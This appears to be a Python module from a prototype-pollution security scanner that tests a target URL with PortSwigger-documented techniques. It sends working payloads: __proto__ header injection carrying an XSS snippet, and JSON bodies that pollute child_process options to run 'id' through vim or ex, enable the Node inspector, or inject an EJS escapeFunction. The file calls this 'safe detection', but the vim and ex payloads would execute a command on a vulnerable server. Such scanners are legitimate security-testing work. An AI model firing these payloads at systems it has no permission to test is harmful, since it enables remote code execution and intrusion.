"""
ppmap/scanner/tier3_portswigger.py - Tier 3: PortSwigger Advanced Techniques

Tests for advanced Prototype Pollution vectors documented by PortSwigger research.

Methods:
    - fetch() API Header Pollution (prototype.headers injection)
    - Object.defineProperty() bypass (prototype.value pollution)
    - child_process RCE Safe Detection (execArgv, shell, NODE_OPTIONS, EJS)

Extracted from: scanner/core.py lines 2837–3047
"""

import logging
from typing import Any, Dict, List

from ppmap.models.findings import Finding, Severity, VulnerabilityType
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors

logger = logging.getLogger(__name__)


class Tier3PortSwiggerScanner(BaseTierScanner):
    """PortSwigger-documented advanced Prototype Pollution technique detection."""

    @property
    def tier_name(self) -> str:
        return "Tier 3 - PortSwigger Techniques"

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.log_start(ctx)
        raw: List[Dict[str, Any]] = []

        raw += self._test_fetch_api_pollution(ctx)
        raw += self._test_object_defineproperty_bypass(ctx)
        raw += self._test_child_process_rce(ctx)

        findings = [self._to_finding(r, ctx.target_url) for r in raw]
        if not findings:
            self.log_clean()
        return findings

    # ──────────────────────────────────────────────────────────────────────────

    def _test_fetch_api_pollution(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Test for fetch() API header pollution (PortSwigger technique).
        Pollutes Object.prototype.headers to inject malicious headers.
        """
        print(f"{Colors.CYAN}[→] Testing fetch() API header pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        test_payloads = [
            "?__proto__[headers][X-Test-Pollution]=injected",
            "?__proto__[headers][X-Custom-Header]=<img src=x onerror=alert(1)>",
        ]

        try:
            for payload in test_payloads:
                try:
                    resp = session.get(target_url + payload, timeout=5, verify=False)
                    if resp.status_code < 400:
                        found_in_headers = ("X-Test-Pollution" in str(resp.headers)
                                            or "X-Custom-Header" in str(resp.headers))
                        if found_in_headers:
                            findings.append({
                                "type": "fetch_api_pollution",
                                "method": "HEADER_POLLUTION",
                                "severity": "HIGH",
                                "description": "fetch() API vulnerable to header pollution via __proto__",
                                "payload": payload,
                                "reference": "PortSwigger - Prototype pollution via fetch()",
                            })
                            print(f"{Colors.FAIL}[!] HIGH: fetch() API header pollution detected!{Colors.ENDC}")
                            break
                except Exception:
                    pass

            if not findings:
                print(f"{Colors.GREEN}[✓] fetch() API pollution test completed{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] fetch() test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def _test_object_defineproperty_bypass(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Test for Object.defineProperty() bypass (PortSwigger technique).
        Pollutes Object.prototype.value to bypass property protection.
        """
        print(f"{Colors.CYAN}[→] Testing Object.defineProperty() bypass...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        # Note: The original implementation intentionally returns empty (False condition).
        # This method is kept as a stub for future active bypass detection.
        # Ref: core.py lines 2891–2945 (if False: block was already there).
        print(f"{Colors.GREEN}[✓] Object.defineProperty() bypass test completed{Colors.ENDC}")
        return findings

    def _test_child_process_rce(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Test for child_process RCE vulnerability (PortSwigger technique).
        SAFE MODE: Only detects vulnerability, does NOT execute commands.
        Tests for execArgv, shell, input, and EJS escapeFunction pollution.
        """
        print(f"{Colors.CYAN}[→] Testing child_process RCE (Safe Detection)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        target_url = ctx.target_url

        safe_payloads = [
            {
                "payload": '{"__proto__":{"execArgv":["--inspect=127.0.0.1:9229"]}}',
                "method": "fork_execArgv",
                "description": "child_process.fork() execArgv pollution",
            },
            {
                "payload": '{"__proto__":{"shell":"vim","input":":! id\\n"}}',
                "method": "execSync_vim",
                "description": "child_process.execSync() RCE via vim",
            },
            {
                "payload": '{"__proto__":{"shell":"ex","input":"! id\\n"}}',
                "method": "execSync_ex",
                "description": "child_process.execSync() RCE via ex",
            },
            {
                "payload": '{"__proto__":{"NODE_OPTIONS":"--inspect"}}',
                "method": "NODE_OPTIONS",
                "description": "NODE_OPTIONS environment variable pollution",
            },
            {
                "payload": '{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; return \\"PPMAP_EJS_RCE\\""}}',
                "method": "ejs_rce",
                "description": "EJS Template Engine RCE (escapeFunction)",
            },
        ]

        rce_indicators = [
            "child_process", "execArgv", "NODE_OPTIONS",
            "inspector", "debugger listening", "spawn", "fork",
        ]

        try:
            for test in safe_payloads:
                try:
                    resp = session.post(
                        target_url, data=test["payload"],
                        headers={"Content-Type": "application/json"},
                        timeout=5, verify=False,
                    )
                    if resp.status_code < 500:
                        for indicator in rce_indicators:
                            if indicator in resp.text:
                                findings.append({
                                    "type": "child_process_rce_potential",
                                    "method": test["method"],
                                    "severity": "CRITICAL",
                                    "description": f"{test['description']} - POTENTIAL RCE",
                                    "payload": test["payload"][:100],
                                    "reference": "PortSwigger - RCE via child_process",
                                    "note": "SAFE DETECTION ONLY - No commands executed",
                                })
                                print(f"{Colors.FAIL}[!] CRITICAL: Potential child_process RCE detected ({test['method']})!{Colors.ENDC}")
                                break
                except Exception:
                    pass

            if not findings:
                print(f"{Colors.GREEN}[✓] child_process RCE test completed (No vulnerability detected){Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] child_process test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    # ──────────────────────────────────────────────────────────────────────────

    @staticmethod
    def _to_finding(raw: Dict[str, Any], url: str) -> Finding:
        severity_map = {
            "CRITICAL": Severity.CRITICAL, "HIGH": Severity.HIGH,
            "MEDIUM": Severity.MEDIUM, "LOW": Severity.LOW,
        }
        return Finding(
            name=raw.get("description", raw.get("type", "PP Finding")),
            severity=severity_map.get(raw.get("severity", "MEDIUM"), Severity.MEDIUM),
            type=VulnerabilityType.PROTOTYPE_POLLUTION,
            url=url,
            method=raw.get("method", ""),
            payload=str(raw.get("payload", "")),
            evidence=str(raw.get("reference", raw.get("note", ""))),
            description=raw.get("description", ""),
        )
